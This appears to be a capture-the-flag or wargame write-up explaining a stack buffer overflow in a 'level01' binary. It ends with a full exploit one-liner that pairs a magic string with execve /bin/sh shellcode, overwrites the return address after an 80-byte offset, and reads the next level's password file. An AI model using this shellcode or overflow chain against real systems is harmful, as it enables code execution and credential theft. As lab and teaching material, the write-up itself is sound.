## Brief

This one compare the user input with some string print some log to the `stdout`. The user input is first stored inside buffer declared as a global variable and then a stack buffer.

## Exploit

This exploit is quite simple and follows the same principe as every stack buffer overflow exploit.

We want to first use the correct input to pass the first check then we will use the second buffer to overwrite the return address.

We're using the pattern generator to find the offset to put our return address. The offset is `80`.

Now we just need to find the address of our buffer in order to execute the shellcode that we will put inside. We will put the shellcode in the first buffer.

## Commands

```bash
(python -c "print('dat_wil' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')"; python -c "print(80*'\x90' + '\x47\xa0\x04\x08')"; echo "cat /home/users/level02/.pass") | ./level01
```